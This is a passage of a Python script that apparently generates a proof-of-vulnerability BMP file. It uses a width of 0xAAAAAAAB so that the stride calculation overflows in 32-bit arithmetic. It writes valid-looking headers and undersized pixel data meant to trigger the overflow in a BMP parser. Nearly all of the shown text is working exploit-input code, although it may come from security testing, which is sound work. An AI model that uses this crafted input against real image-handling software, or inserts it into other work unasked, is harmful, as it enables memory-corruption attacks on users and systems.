w\n# This will definitely overflow!\n\n# But we need allocation to succeed, so let\'s use smaller height\nwidth = 0xAAAAAAAB  # 2863311531 in decimal\nheight = 2\n\n# Calculate stride as the code does (simulating 32-bit overflow)\nstride_calc = ((width * 24 + 31) // 32) * 4\n# In 32-bit arithmetic: width * 24 overflows\nwidth_24_32bit = (width * 24) & 0xFFFFFFFF\nstride_32bit = ((width_24_32bit + 31) // 32) * 4\n\nprint(f"Width: {width} (0x{width:x})")\nprint(f"Height: {height}")\nprint(f"Width * 24 (64-bit): {width * 24} (0x{width * 24:x})")\nprint(f"Width * 24 (32-bit): {width_24_32bit} (0x{width_24_32bit:x})")\nprint(f"Stride (32-bit): {stride_32bit}")\n\n# Create BMP file\nwith open(output_path, "wb") as f:\n    # File Header (14 bytes)\n    file_size = 54 + stride_32bit * height  # Header + pixel data\n    f.write(b\'BM\')  # Signature\n    f.write(struct.pack(\'<I\', file_size))  # File size\n    f.write(struct.pack(\'<H\', 0))  # Reserved1\n    f.write(struct.pack(\'<H\', 0))  # Reserved2\n    f.write(struct.pack(\'<I\', 54))  # Offset to pixel data\n    \n    # Info Header (40 bytes - BITMAPINFOHEADER)\n    f.write(struct.pack(\'<I\', 40))  # Info header size\n    f.write(struct.pack(\'<I\', width))  # Width\n    f.write(struct.pack(\'<I\', height))  # Height\n    f.write(struct.pack(\'<H\', 1))  # Planes\n    f.write(struct.pack(\'<H\', 24))  # Bits per pixel (24-bit RGB)\n    f.write(struct.pack(\'<I\', 0))  # Compression (0 = uncompressed)\n    f.write(struct.pack(\'<I\', stride_32bit * height))  # Image size\n    f.write(struct.pack(\'<I\', 2835))  # X pixels per meter\n    f.write(struct.pack(\'<I\', 2835))  # Y pixels per meter\n    f.write(struct.pack(\'<I\', 0))  # Colors used\n    f.write(struct.pack(\'<I\', 0))  # Important colors\n    \n    # Pixel data (minimal data to trigger the overflow during parsing)\n    pixel_data = b\'\\xff\' * (stride_32bit * height)\n    f.write(pixel_data)\n\nprint(f"Generated PoV at {output_path}")\nprint(f"File size: